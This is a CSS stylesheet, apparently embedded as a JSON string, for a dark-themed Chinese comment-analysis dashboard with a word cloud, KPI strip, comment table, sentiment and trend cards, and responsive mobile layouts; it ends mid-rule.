  css: "/* 评论分析台 · 样式\n   v2 视觉：单一强调色只落在数据上；中性纯净深色底；1px 线分隔；无渐变、无玻璃、无发光。\n   参考 tasteskill（app-screens）：KPI 一大格用线切分、数字右对齐等宽、面板无阴影、标题 20px。 */\n\n:root {\n  --bg: #0b0b0c;\n  --surface: #131315;\n  --surface-2: #1a1a1d;\n  --line: #27272b;\n  --line-strong: #3a3a40;\n  --ink: #f4f4f5;\n  --text: #d3d3d6;\n  --muted: #a3a3a8;\n  --meta: #8e8e94;\n  --accent: #e0a94a;\n  --accent-ink: #1a1206;\n  --accent-dim: #2a2213;\n  --pos: #6cc59a;\n  --neg: #e08a84;\n  --r: 8px;\n  --r-ctl: 6px;\n  --shadow-float: 0 18px 44px rgba(0, 0, 0, .55);\n  --font: \"Segoe UI\", Inter, \"Microsoft YaHei UI\", \"Microsoft YaHei\", \"PingFang SC\", system-ui, -apple-system, sans-serif;\n  --mono: \"Cascadia Mono\", Consolas, ui-monospace, SFMono-Regular, Menlo, monospace;\n}\n\n* { box-sizing: border-box; }\nhtml, body { margin: 0; padding: 0; }\nbody {\n  background: var(--bg);\n  color: var(--text);\n  font: 14px/1.5 var(--font);\n  font-variant-numeric: tabular-nums;\n  min-height: 100vh;\n  padding-bottom: 32px;\n  -webkit-font-smoothing: antialiased;\n}\n\n/* ---------- 控件 ---------- */\n.btn {\n  appearance: none;\n  border: 1px solid var(--line-strong);\n  background: transparent;\n  color: var(--text);\n  padding: 7px 13px;\n  border-radius: var(--r-ctl);\n  font: 500 13px/1.25 var(--font);\n  cursor: pointer;\n  white-space: nowrap;\n  transition: border-color .15s, background .15s, color .15s;\n}\n.btn:hover { border-color: #55555c; color: var(--ink); background: #17171a; }\n.btn:active { transform: translateY(1px); }\n.btn:disabled { opacity: .4; cursor: not-allowed; }\n.btn:focus-visible, .select:focus-visible, .input:focus-visible { outline: 2px solid var(--accent); outline-offset: 1px; }\n/* 主操作：反白，不用强调色 */\n.btn.primary { background: var(--ink); border-color: var(--ink); color: #111113; font-weight: 600; }\n.btn.primary:hover { background: #fff; border-color: #fff; color: #000; }\n.btn.ghost { border-color: transparent; color: var(--muted); }\n.btn.ghost:hover { color: var(--ink); background: var(--surface-2); border-color: transparent; }\n.btn.small { padding: 5px 10px; font-size: 13px; }\n\n.select, .input {\n  appearance: none;\n  background: var(--surface-2);\n  color: var(--text);\n  border: 1px solid var(--line);\n  border-radius: var(--r-ctl);\n  padding: 6px 10px;\n  font: 13px/1.3 var(--font);\n  min-width: 130px;\n}\n.select { background-image: linear-gradient(45deg, transparent 50%, var(--meta) 50%), linear-gradient(135deg, var(--meta) 50%, transparent 50%); background-position: calc(100% - 15px) 52%, calc(100% - 10px) 52%; background-size: 5px 5px, 5px 5px; background-repeat: no-repeat; padding-right: 28px; }\n.select.small { min-width: 66px; padding: 4px 24px 4px 8px; font-size: 13px; }\n.input { min-width: 280px; }\n.input::placeholder { color: #7c7c82; }\n.select:hover, .input:hover { border-color: var(--line-strong); }\n\n.muted { color: var(--muted); }\n.small { font-size: 13px; }\n.meta { color: var(--meta); font-size: 13px; }\ncode { font-family: var(--mono); background: var(--surface-2); border: 1px solid var(--line); padding: 1px 5px; border-radius: 4px; font-size: 13px; color: var(--text); }\n.hidden { display: none !important; }\n.inline { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }\n\n/* ---------- 外壳 ---------- */\n.topbar {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  gap: 16px;\n  padding: 22px 28px 14px;\n  flex-wrap: wrap;\n}\n.brand { display: flex; align-items: center; gap: 11px; min-width: 0; }\n.brand .mark {\n  width: 30px; height: 30px; flex: 0 0 30px;\n  color: var(--accent);\n}\n.brand .shell-id { display: flex; flex-direction: column; gap: 2px; min-width: 0; }\n.brand h1 { font-size: 20px; line-height: 1.25; margin: 0; font-weight: 600; letter-spacing: -.01em; color: var(--ink); }\n.brand .scope { margin: 0; font-size: 13px; color: var(--meta); }\n.actions { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }\n\n/* ---------- KPI：一格，用线切分 ---------- */\n.kpis {\n  display: grid;\n  grid-auto-flow: column;\n  grid-auto-columns: 1fr;\n  margin: 0 28px 16px;\n  background: var(--surface);\n  border: 1px solid var(--line);\n  border-radius: var(--r);\n  overflow: hidden;\n}\n.kpis:empty { display: none; }\n.kpi { padding: 13px 18px 14px; min-width: 0; }\n.kpi + .kpi { box-shadow: inset 1px 0 0 var(--line); }\n.kpi .k { font-size: 13px; color: var(--meta); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }\n.kpi .v { margin-top: 4px; font-size: 24px; line-height: 1.15; font-weight: 500; color: var(--ink); letter-spacing: -.01em; }\n.kpi .v small { font-size: 13px; font-weight: 400; color: var(--meta); margin-left: 5px; letter-spacing: 0; }\n@media (max-width: 860px) {\n  .kpis { grid-auto-flow: row; grid-template-columns: repeat(3, 1fr); }\n  .kpi + .kpi { box-shadow: inset 1px 0 0 var(--line); }\n}\n\n/* ---------- 主网格 ---------- */\n.grid {\n  display: grid;\n  grid-template-columns: minmax(0, 1fr) 322px;\n  gap: 14px;\n  padding: 0 28px 14px;\n  align-items: stretch;\n}\n@media (max-width: 1080px) {\n  .grid { grid-template-columns: minmax(0, 1fr); }\n  .side { position: static; }\n}\n\n.panel {\n  background: var(--surface);\n  border: 1px solid var(--line);\n  border-radius: var(--r);\n  min-width: 0;\n}\n.panel-head {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  gap: 12px;\n  padding: 12px 16px;\n  border-bottom: 1px solid var(--line);\n  flex-wrap: wrap;\n}\n.panel-head .panel-title { display: flex; align-items: baseline; gap: 10px; min-width: 0; }\n.panel-head h2 { font-size: 16px; font-weight: 600; margin: 0; color: var(--ink); letter-spacing: -.005em; }\n.panel-head .panel-sub { font-size: 13px; color: var(--meta); }\n.panel-head.sub { border-bottom: 0; padding: 12px 16px 2px; }\n.panel-head.sub h2 { font-size: 13px; font-weight: 600; color: var(--muted); }\n\n/* ---------- 词云 ---------- */\n.cloud-panel { display: flex; flex-direction: column; position: relative; height: 100%; }\n.cloud {\n  position: relative;\n  flex: 1 1 auto;\n  min-height: clamp(340px, 48vh, 500px);\n  margin: 0;\n  overflow: hidden;\n  background: var(--bg);\n  contain: layout paint;\n}\n.cloud-empty, .empty {\n  position: absolute; inset: 0;\n  pointer-events: none;\n  display: flex; flex-direction: column; align-items: center; justify-content: center;\n  gap: 6px; text-align: center; padding: 28px; color: var(--muted);\n}\n.empty .empty-mark { color: var(--line-strong); margin-bottom: 6px; }\n.empty strong { color: var(--text); font-weight: 600; font-size: 16px; }\n.empty p { margin: 0; font-size: 13px; color: var(--meta); line-height: 1.6; }\n.empty .btn { pointer-events: auto; margin-top: 12px; }\n.cloud-foot {\n  display: flex; align-items: center; justify-content: space-between; gap: 12px;\n  padding: 9px 16px; border-top: 1px solid var(--line);\n  font-size: 12px; color: var(--meta); flex-wrap: wrap;\n}\n.cloud-foot .swatch { display: inline-block; width: 8px; height: 8px; border-radius: 2px; background: var(--accent); vertical-align: 0; margin-right: 5px; }\n.cloud-foot .swatch.grey { background: #b9b9be; }\n.cloud-foot .swatch.mono { background: #8e8e94; }\n\n.cw {\n  position: absolute;\n  left: 0; top: 0;\n  white-space: nowrap;\n  cursor: pointer;\n  user-select: none;\n  line-height: 1;\n  transform-origin: center center;\n  transition: transform .14s ease-out, color .14s, opacity .14s;\n  will-change: transform;\n}\n.cw:hover, .cw.hot { transform: scale(1.22); z-index: 30; color: var(--ink) !important; }\n.cw.dim { opacity: .22; }\n\n/* ---------- 侧栏 ---------- */\n.side { position: sticky; top: 12px; display: flex; flex-direction: column; align-self: stretch; max-height: calc(100vh - 24px); overflow-y: auto; overscroll-behavior: contain; }\n.word-list { list-style: none; margin: 0; padding: 6px 8px; flex: 0 0 auto; height: 322px; max-height: 322px; overflow: auto; }\n.word-list li {\n  display: grid;\n  grid-template-columns: 22px minmax(0, 1fr) auto;\n  align-items: center;\n  gap: 10px;\n  padding: 6px 8px;\n  border-radius: var(--r-ctl);\n  cursor: pointer;\n  font-size: 13px;\n  color: var(--text);\n}\n.word-list li:hover { background: var(--surface-2); color: var(--ink); }\n.word-list li .rank { color: var(--meta); font-size: 11px; text-align: right; }\n.word-list li .w { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n.word-list li .n { color: var(--meta); font-size: 13px; text-align: right; }\n.word-list li .mark { width: 3px; height: 14px; border-radius: 1px; background: var(--accent); }\n.side-body { padding: 8px 16px 16px; display: flex; flex-direction: column; gap: 10px; border-top: 1px solid var(--line); }\n/* v0.5.47：侧栏防御 —— 即使外层样式被旧缓存/窄容器影响，子项也整行铺开，复选框文字不逐字折行（曾出现「只看有主页的用户」竖排） */\n.side-body { flex-wrap: nowrap; align-items: stretch; }\n.side-body > * { flex: 0 0 auto; width: 100%; min-width: 0; }\n.check { white-space: nowrap; }\n.check input { flex: 0 0 auto; }\n.field { display: flex; flex-direction: column; gap: 5px; font-size: 13px; color: var(--meta); }\n.field .select { width: 100%; }\n.check { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text); cursor: pointer; }\n.check input { accent-color: var(--ink); width: 14px; height: 14px; }\n\n/* ---------- 表格 ---------- */\n.table-panel { margin: 0 28px; }\n.table-wrap { position: relative; overflow: auto; height: 620px; min-height: 420px; max-height: 620px; }\ntable { width: 100%; border-collapse: collapse; table-layout: fixed; }\nthead th {\n  position: sticky; top: 0; z-index: 2;\n  background: var(--surface);\n  text-align: left;\n  font-size: 12px;\n  font-weight: 500;\n  color: var(--meta);\n  padding: 10px 14px;\n  border-bottom: 1px solid var(--line);\n}\ntbody td {\n  padding: 11px 14px;\n  border-bottom: 1px solid #1e1e21;\n  vertical-align: top;\n  font-size: 13px;\n  color: var(--text);\n}\ntbody tr:last-child td { border-bottom: 0; }\ntbody tr:hover { background: #17171a; }\n.col-text { width: auto; }\n.col-user { width: 176px; }\n.col-num { width: 76px; text-align: right; }\n.col-ip { width: 84px; }\n.col-time { width: 132px; white-space: nowrap; }\ntd.muted { white-space: nowrap; }\n.col-level { width: 68px; }\ntd.num { text-align: right; color: var(--ink); }\ntd .txt { white-space: pre-wrap; word-break: break-word; color: var(--ink); }\ntd .txt .hl { background: #4a3a17; color: #f0cd8f; border-radius: 2px; padding: 0 2px; }\n.video-link { color: var(--meta); text-decoration: none; }\n.video-link:hover { color: var(--text); text-decoration: underline; }\n.badges { display: inline-flex; gap: 5px; margin-left: 6px; vertical-align: 1px; }\n.badge {\n  font-size: 11px;\n  line-height: 1.5;\n  border-radius: 4px;\n  padding: 0 5px;\n  border: 1px solid var(--line);\n  color: var(--meta);\n  white-space: nowrap;\n}\n.badge.hot { color: #f0cd8f; border-color: #4a3a17; background: var(--accent-dim); }\n.badge.reply { color: #c8c8cd; border-color: #333338; background: #1c1c20; }\n.badge.fold { color: var(--meta); }\n.user-cell { display: flex; align-items: center; gap: 9px; min-width: 0; }\n.avatar {\n  width: 26px; height: 26px; border-radius: 50%;\n  flex: 0 0 26px;\n  display: flex; align-items: center; justify-content: center;\n  font-size: 11px; font-weight: 600;\n  background: #232327;\n  color: #c9c9ce;\n}\n.user-meta { min-width: 0; }\n.user-name {\n  display: block;\n  color: var(--text);\n  text-decoration: none;\n  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;\n  max-width: 132px;\n}\na.user-name:hover { color: var(--ink); text-decoration: underline; }\n.user-name.nolink { color: var(--meta); cursor: default; }\n.user-sub { font-family: var(--mono); font-size: 12px; color: var(--meta); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 132px; }\n.empty.small { position: static; padding: 28px; }\n\n.pager { display: flex; align-items: center; justify-content: center; gap: 4px; padding: 12px; flex-wrap: wrap; }\n.pager button {\n  min-width: 30px;\n  padding: 4px 8px;\n  border-radius: var(--r-ctl);\n  border: 1px solid transparent;\n  background: transparent;\n  color: var(--muted);\n  font: 500 12px/1.4 var(--font);\n  cursor: pointer;\n}\n.pager button:hover { color: var(--ink); background: var(--surface-2); }\n.pager button.on { background: var(--ink); border-color: var(--ink); color: #111113; font-weight: 600; }\n.pager button:disabled { opacity: .32; cursor: not-allowed; }\n.pager .info { color: var(--meta); font-size: 13px; margin: 0 8px; }\n\n.foot {\n  display: flex; justify-content: space-between; gap: 12px; flex-wrap: wrap;\n  padding: 16px 30px 0; color: var(--meta); font-size: 12px;\n}\n\n/* ---------- 悬浮框（浮层才给阴影） ---------- */\n.tooltip {\n  position: fixed;\n  z-index: 100;\n  max-width: 380px;\n  background: var(--surface-2);\n  border: 1px solid var(--line-strong);\n  border-radius: var(--r);\n  box-shadow: var(--shadow-float);\n  padding: 12px 14px;\n  pointer-events: auto;\n}\n.tooltip .tt-word { font-size: 15px; font-weight: 600; color: var(--ink); }\n.tooltip .tt-meta { color: var(--meta); font-size: 13px; margin: 3px 0 9px; }\n.tt-comments { display: flex; flex-direction: column; gap: 0; }\n.tt-item {\n  display: block; text-decoration: none; color: inherit;\n  padding: 8px 0;\n  border-top: 1px solid var(--line);\n}\n.tt-item:first-child { border-top: 0; }\n.tt-item:hover { background: #1f1f23; }\n.tt-item .tt-txt { font-size: 13px; color: var(--text); display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }\n.tt-item .tt-user { font-size: 13px; color: var(--meta); margin-top: 3px; }\n.tt-item .tt-user .go { color: var(--text); text-decoration: underline; text-underline-offset: 2px; }\n.tt-more { margin-top: 8px; padding-top: 9px; border-top: 1px solid var(--line); font-size: 13px; color: var(--text); cursor: pointer; user-select: none; }\n.tt-more:hover { color: var(--ink); text-decoration: underline; }\n\n/* ---------- 抽屉 ---------- */\n.drawer {\n  position: fixed;\n  right: 0; top: 0; bottom: 0;\n  width: min(560px, 94vw);\n  z-index: 90;\n  background: var(--surface);\n  border-left: 1px solid var(--line-strong);\n  box-shadow: -18px 0 44px rgba(0, 0, 0, .45);\n  display: flex;\n  flex-direction: column;\n  animation: slideIn .16s ease-out;\n}\n@keyframes slideIn { from { transform: translateX(18px); opacity: .7; } to { transform: none; opacity: 1; } }\n.drawer-head {\n  display: flex; align-items: flex-start; justify-content: space-between; gap: 12px;\n  padding: 16px 18px 13px; border-bottom: 1px solid var(--line);\n}\n.drawer-head h3 { margin: 0 0 3px; font-size: 16px; font-weight: 600; color: var(--ink); }\n.drawer-head p { margin: 0; }\n.drawer-body { flex: 1 1 auto; overflow: auto; padding: 4px 14px 8px; }\n.dc { padding: 12px 4px; border-bottom: 1px solid var(--line); }\n.dc:last-child { border-bottom: 0; }\n.dc-head { display: flex; align-items: center; justify-content: space-between; gap: 10px; margin-bottom: 7px; }\n.dc-user { display: flex; align-items: center; gap: 9px; min-width: 0; }\n.dc-text { white-space: pre-wrap; word-break: break-word; font-size: 13px; color: var(--ink); }\n.dc-meta { display: flex; gap: 12px; flex-wrap: wrap; color: var(--meta); font-size: 13px; margin-top: 8px; }\n.dc-meta .spacer { flex: 1 1 auto; }\n.dc-go {\n  color: var(--text); font-size: 12px; text-decoration: none; white-space: nowrap;\n  border: 1px solid var(--line-strong); padding: 3px 9px; border-radius: var(--r-ctl);\n}\n.dc-go:hover { color: var(--ink); border-color: #55555c; background: var(--surface-2); }\n.dc-go.off { color: var(--meta); border-color: var(--line); cursor: default; }\n.drawer-foot {\n  display: flex; justify-content: space-between; gap: 10px;\n  padding: 12px 18px; border-top: 1px solid var(--line);\n}\n.drawer-foot .btn { flex: 1 1 auto; }\n\n/* ---------- toast ---------- */\n.toast {\n  position: fixed;\n  left: 50%; bottom: 28px;\n  transform: translateX(-50%);\n  background: var(--surface-2);\n  border: 1px solid var(--line-strong);\n  color: var(--text);\n  padding: 9px 16px;\n  border-radius: var(--r);\n  font-size: 13px;\n  z-index: 150;\n  box-shadow: var(--shadow-float);\n  max-width: min(720px, 92vw);\n}\n\n/* ---------- 加载骨架屏（请求/解析时占位，避免白屏与跳动） ---------- */\nbody.is-loading #cloud .cw,\nbody.is-loading #cloudEmpty,\nbody.is-loading #tbody,\nbody.is-loading #tableEmpty,\nbody.is-loading #wordList li:not(.sk-li) { visibility: hidden; }\nbody.is-loading .kpi .v { color: transparent; position: relative; }\nbody.is-loading .kpi .v::after {\n  content: '';\n  position: absolute;\n  left: 0;\n  top: 50%;\n  transform: translateY(-50%);\n  width: 66px;\n  height: 22px;\n  border-radius: 4px;\n  background: #2e2e34;\n  animation: skPulse 1.15s ease-in-out infinite;\n}\n.sk-cloud {\n  position: absolute;\n  inset: 14px;\n  display: none;\n}\n.sk-cloud i {\n  position: absolute;\n  display: block;\n  border-radius: 12px;\n  background: #26262c;\n  animation: skBlockPulse 1.5s ease-in-out infinite;\n}\n.sk-table {\n  position: absolute;\n  inset: 0;\n  padding: 16px 18px;\n  display: none;\n  flex-direction: column;\n  gap: 15px;\n  background: var(--surface);\n}\n.sk-row { display: flex; gap: 16px; align-items: center; }\n.sk-row i {\n  height: 12px;\n  border-radius: 3px;\n  background: #2e2e34;\n  animation: skPulse 1.15s ease-in-out infinite;\n}\n@keyframes skBlockPulse { 0%, 100% { opacity: 0.35 } 50% { opacity: 0.75 } }\n@keyframes skPulse { 0%, 100% { opacity: 0.5 } 50% { opacity: 1 } }\nbody.is-loading .sk-cloud { display: block; }\nbody.is-loading .sk-table { display: flex; }\n#wordList li.sk-li { opacity: 1; display: block; padding: 4px 0; }\nbody.is-loading .kpi .v * { color: transparent; }\n#wordList li.sk-li i {\n  display: block;\n  height: 12px;\n  border-radius: 3px;\n  background: #2e2e34;\n  animation: skPulse 1.15s ease-in-out infinite;\n}\n.sk-cloud[hidden],\n.sk-table[hidden] { display: none !important; }\n\n/* ---------- 空状态：布局保持不变，只把内容变淡（避免切换数据时整页重排） ---------- */\nbody.is-empty .cloud-panel { min-height: 460px; }\nbody.is-empty .side .word-list,\nbody.is-empty .side .filters,\nbody.is-empty .table-wrap tbody { opacity: 0.55; }\n\n/* 滚动条 */\n::-webkit-scrollbar { width: 10px; height: 10px; }\n::-webkit-scrollbar-thumb { background: #2c2c31; border-radius: 8px; border: 2px solid var(--surface); }\n::-webkit-scrollbar-thumb:hover { background: #3a3a40; }\n::-webkit-scrollbar-track { background: transparent; }\n\n/* v0.5.41：自定义加词 / 屏蔽词 */\n.kw-tune {\n  margin-top: 10px;\n  padding-top: 10px;\n  border-top: 1px solid var(--line);\n  display: flex;\n  flex-direction: column;\n  gap: 6px;\n}\n.kw-row { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--meta); }\n.kw-row > span { flex: 0 0 34px; }\n.kw-input {\n  flex: 1 1 auto;\n  min-width: 0;\n  background: var(--surface-2);\n  border: 1px solid var(--line);\n  color: var(--text);\n  border-radius: 6px;\n  padding: 5px 8px;\n  font-size: 13px;\n  font-family: inherit;\n}\n.kw-input::placeholder { color: var(--meta); opacity: 0.7; }\n.kw-input:focus { outline: none; border-color: var(--line-strong); }\n\n\n/* ===================== v2.8：洞察面板（情感 / 趋势 / 地域 / 主题） ===================== */\n.insights { padding-bottom: 4px; }\n.insight-grid {\n  display: grid;\n  grid-template-columns: repeat(2, minmax(0, 1fr));\n  gap: 1px;\n  background: var(--line);\n  border-top: 1px solid var(--line);\n}\n.insight-card { background: var(--surface); padding: 12px 18px 14px; min-width: 0; }\n.insight-head { display: flex; align-items: baseline; justify-content: space-between; gap: 10px; margin-bottom: 8px; }\n.insight-head h3 { margin: 0; font-size: 13px; font-weight: 600; color: var(--text); letter-spacing: .02em; }\n.insight-body { min-height: 96px; }\n.insights.is-empty .insight-body { color: var(--meta); }\n.sent-bar { display: flex; height: 8px; border-radius: 4px; overflow: hidden; background: var(--surface-2); }\n.sent-seg { display: block; height: 100%; }\n.sent-seg.pos { background: var(--pos); }\n.sent-seg.neu { background: var(--line-strong); }\n.sent-seg.neg { background: var(--neg); }\n.sent-list { display: flex; flex-wrap: wrap; gap: 6px 16px; margin-top: 9px; font-size: 13px; color: var(--muted); }\n.sent-list .sw-dot { display: inline-block; width: 7px; height: 7px; border-radius: 50%; margin-right: 6px; vertical-align: 1px; }\n.sw-dot.pos { background: var(--pos); }\n.sw-dot.neu { background: var(--line-strong); }\n.sw-dot.neg { background: var(--neg); }\n.mini-list { margin-top: 12px; border-top: 1px solid var(--line); padding-top: 8px; }\n.mini-h { font-size: 12px; color: var(--meta); margin-bottom: 4px; }\n.mini-row { display: flex; width: 100%; gap: 10px; padding: 4px 0; background: none; border: 0; text-align: left; color: var(--text); font-size: 13px; cursor: pointer; }\n.mini-row:hover .mini-txt { color: var(--ink); }\n.mini-txt { flex: 1 1 auto; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n.mini-num { flex: 0 0 auto; color: var(--meta); font-variant-numeric: tabular-nums; }\n.trend { width: 100%; height: 92px; display: block; }\n.trend .area { fill: rgba(224, 169, 74, .10); }\n.trend .line { fill: none; stroke: var(--accent); stroke-width: 1.6; }\n.trend .negline { fill: none; stroke: var(--neg); stroke-width: 1.2; stroke-dasharray: 3 3; opacity: .85; }\n.trend .dot { fill: var(--accent); }\n.legend { display: flex; flex-wrap: wrap; gap: 6px 14px; font-size: 12px; color: var(--meta); margin-top: 6px; }\n.legend i { display: inline-block; width: 14px; height: 2px; margin-right: 6px; vertical-align: 3px; }\n.legend .sw-line { background: var(--accent); }\n.legend .sw-neg { background: var(--neg); }\n.axis { display: flex; justify-content: space-between; font-size: 11px; color: var(--meta); margin-top: 2px; font-variant-numeric: tabular-nums; }\n.region-row { display: flex; align-items: center; gap: 10px; padding: 3px 0; font-size: 13px; }\n.region-name { flex: 0 0 62px; color: var(--muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n.region-bar { flex: 1 1 auto; height: 6px; background: var(--surface-2); border-radius: 3px; overflow: hidden; }\n.region-bar i { display: block; height: 100%; background: var(--line-strong); }\n.region-num { flex: 0 0 auto; width: 52px; text-align: right; color: var(--meta); font-variant-numeric: tabular-nums; }\n.topic-item { padding: 7px 0; border-top: 1px solid var(--line); }\n.topic-item:first-child { border-top: 0; padding-top: 0; }\n.topic-main { display: flex; width: 100%; gap: 10px; align-items: baseline; background: none; border: 0; padding: 0; cursor: pointer; text-align: left; }\n.topic-label { flex: 1 1 auto; font-size: 13px; color: var(--ink); font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n.topic-main:hover .topic-label { color: var(--accent); }\n.topic-count { flex: 0 0 auto; font-size: 12px; color: var(--meta); font-variant-numeric: tabular-nums; }\n.topic-terms { display: flex; flex-wrap: wrap; gap: 5px; margin: 5px 0 4px; }\n.chip { border: 1px solid var(--line-strong); background: var(--surface-2); color: var(--muted); font-size: 12px; padding: 1px 7px; border-radius: 10px; cursor: pointer; }\n.chip:hover { color: var(--ink); border-color: var(--accent); }\n.topic-rep { font-size: 12px; color: var(--meta); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; line-height: 1.6; }\n.sbadge { display: inline-block; padding: 0 6px; border-radius: 9px; font-size: 12px; line-height: 18px; }\n.sbadge.pos { color: var(--pos); background: rgba(108, 197, 154, .12); }\n.sbadge.neu { color: var(--meta); background: rgba(142, 142, 148, .12); }\n.sbadge.neg { color: var(--neg); background: rgba(224, 138, 132, .14); }\n.col-sent { width: 76px; }\n@media (max-width: 900px) {\n  .insight-grid { grid-template-columns: 1fr; }\n}\n\n/* v3.1：情感健康度卡（跨两列） */\n.insight-card.health { grid-column: 1 / -1; }\n.health-top { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }\n.health-score b { font-size: 30px; line-height: 1; font-variant-numeric: tabular-nums; }\n.health-score small { color: var(--meta); margin-left: 2px; }\n.health-grade { padding: 2px 10px; border-radius: 999px; font-size: 12px; border: 1px solid var(--line-strong); }\n.health-grade.h-good { color: #6cc59a; border-color: rgba(108, 197, 154, .45); }\n.health-grade.h-ok { color: #a8d08d; border-color: rgba(168, 208, 141, .45); }\n.health-grade.h-mid { color: #e0a94a; border-color: rgba(224, 169, 74, .45); }\n.health-grade.h-warn { color: #e0a94a; border-color: rgba(224, 169, 74, .6); }\n.health-grade.h-bad { color: #e08a84; border-color: rgba(224, 138, 132, .5); }\n.health-bar { position: relative; flex: 1 1 240px; height: 8px; border-radius: 4px; background: var(--surface-2); overflow: hidden; }\n.health-bar i { display: block; height: 100%; border-radius: 4px; }\n.health-bar i.h-good { background: #6cc59a; }\n.health-bar i.h-ok { background: #a8d08d; }\n.health-bar i.h-mid, .health-bar i.h-warn { background: #e0a94a; }\n.health-bar i.h-bad { background: #e08a84; }\n.health-bar .mk { position: absolute; top: 0; bottom: 0; width: 1px; background: var(--bg); opacity: .8; }\n.health-metrics { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }\n.health-metrics th, .health-metrics td { text-align: left; padding: 4px 6px; border-bottom: 1px solid var(--line); color: var(--muted); }\n.health-metrics th { color: var(--meta); font-weight: 500; }\n.health-metrics td.num { text-align: right; font-variant-numeric: tabular-nums; color: var(--text); }\n.health-metrics tbody tr:last-child td { border-bottom: 0; }\n\n/* ==========================================================================\n   v4.0 设备兼容性适配 + 视觉打磨\n   - 间距/字号用 clamp，360~1920px 不出现横向溢出\n   - KPI 用 1px gap 画线：换行时分割线不错位\n   - ≤620px 评论表变卡片列表（td 的 data-label 由 app.js 注入）\n   - 触屏：关掉 hover 放大、控件热区 ≥40px；尊重 prefers-reduced-motion\n   ========================================================================== */\n:root {\n  --pad-x: clamp(16px, 3vw, 28px);\n  --gap-y: clamp(10px, 1.4vw, 16px);\n  --r-panel: 10px;\n}\nhtml { -webkit-text-size-adjust: 100%; text-size-adjust: 100%; }\nbody {\n  overflow-x: hidden;\n  padding-left: env(safe-area-inset-left);\n  padding-right: env(safe-area-inset-right);\n  padding-bottom: calc(28px + env(safe-area-inset-bottom));\n}\nbutton, .btn, .select, .input, .check, .kw-input { touch-action: manipulation; }\ncode { overflow-wrap: anywhere; }\n.empty p { overflow-wrap: anywhere; }\n\n/* 外壳：统一水平节奏 */\n.topbar { padding: clamp(14px, 2.6vw, 22px) var(--pad-x) clamp(10px, 1.6vw, 14px); }\n.brand h1 { font-size: clamp(18px, 1.6vw, 20px); }\n.kpis {\n  margin: 0 var(--pad-x) var(--gap-y);\n  display: grid;\n  grid-auto-flow: column;\n  grid-auto-columns: minmax(0, 1fr);\n  gap: 1px;\n  background: var(--line);\n  border: 1px solid var(--line);\n  border-radius: var(--r-panel);\n  overflow: hidden;\n}\n.kpi {\n  background: var(--surface);\n  box-shadow: none !important;\n  padding: clamp(10px, 1.2vw, 14px) clamp(12px, 1.4vw, 18px);\n}\n.kpi .v { font-size: clamp(20px, 1.9vw, 26px); }\n.grid { padding: 0 var(--pad-x) var(--gap-y); gap: var(--gap-y); }\n.panel { border-radius: var(--r-panel); }\n.panel-head { padding: 12px clamp(12px, 1.4vw, 18px); }\n.table-panel { margin: 0 var(--pad-x); }\n.table-wrap { height: auto; max-height: 620px; min-height: 240px; }\nbody.is-empty .table-wrap { min-height: 140px; max-height: none; }\n.foot { padding: clamp(12px, 1.6vw, 18px) var(--pad-x) 0; }\n\n/* 平板：KPI 换 4 列 */\n@media (max-width: 900px) {\n  .kpis { grid-auto-flow: row; grid-template-columns: repeat(4, minmax(0, 1fr)); }\n}\n/* 平板竖屏 / 大手机：单列主区、侧栏不粘顶 */\n@media (max-width: 1080px) {\n  .side { position: static; max-height: none; overflow: visible; }\n  .word-list { height: auto; max-height: min(46vh, 380px); }\n  .cloud { min-height: clamp(240px, 40vh, 420px); }\n}\n/* 手机：顶栏竖排、KPI 2 列、洞察单列 */\n@media (max-width: 700px) {\n  .kpis { grid-template-columns: repeat(2, minmax(0, 1fr)); }\n  .topbar { flex-direction: column; align-items: stretch; gap: 12px; }\n  .actions { justify-content: flex-start; }\n  .actions .btn { flex: 1 1 auto; }\n  .brand .mark { width: 26px; height: 26px; flex-basis: 26px; }\n  .insight-grid { grid-template-columns: 1fr; }\n  .insight-card { padding: 12px 14px; }\n  .cloud-foot { font-size: 12px; gap: 6px 12px; }\n  .cloud-foot span:last-child { display: none; }\n  .pager { gap: 2px; padding: 10px 6px; }\n  .pager button { min-width: 28px; padding: 6px 7px; }\n  .pager .info { flex: 0 0 100%; text-align: center; margin: 4px 0 0; }\n}\n/* 窄手机：评论表变卡片列表 */\n@media (max-width: 620px) {\n  .table-wrap { max-height: none; overflow: visible; }\n  #table, #table tbody, #table tbody tr { display: block; }\n  #table thead { display: none; }\n  #table tbody tr { padding: 12px 14px; border-bottom: 1px solid var(--line); }\n  #table tbody tr:last-child { border-bottom: 0; }\n  #table tbody td { display: flex; align-items: flex-start; gap: 10px; padding: 3px 0; border: 0; font-size: 13px; }\n  #table tbody td::before { content: attr(data-label); flex: 0 0 52px; color: var(--meta); font-size: 12px; line-height: 1.6; }\n  #table tbody td.cell-text { display: block; padding: 0 0 6px; }\n  #table tbody td.cell-text::before { content: none; }\n  #table tbody td .txt { font-size: 14px; }\n  #table tbody td .user-name, #table tbody td .user-sub { max-width: 100%; }\n  #table tbody td.num { text-align: left; }\n  #table tbody td:empty { display: none; }\n  .table-panel .panel-head .inline { width: 100%; }\n  .table-panel .panel-head .input { min-width: 0; flex: 1 1 100%; }\n  .table-panel .panel-head .select, .table-panel .panel-head .btn { flex: 1 1 auto; }\n}\n/* 触屏：点击热区 + 关掉 hover 放大 */\n@media (hover: none), (pointer: coarse) {\n  .cw:hover { transform: none; }\n  .cw.hot { transform: scale(1.05); }\n  .btn, .select, .input { min-height: 40px; }\n  .check { min-height: 40px; }\n  .word-list li { padding: 10px 8px; }\n  .tt-item { padding: 10px 0; }\n}\n/* 大屏：侧栏略宽、词云更高 */\n@media (min-width: 1600px) 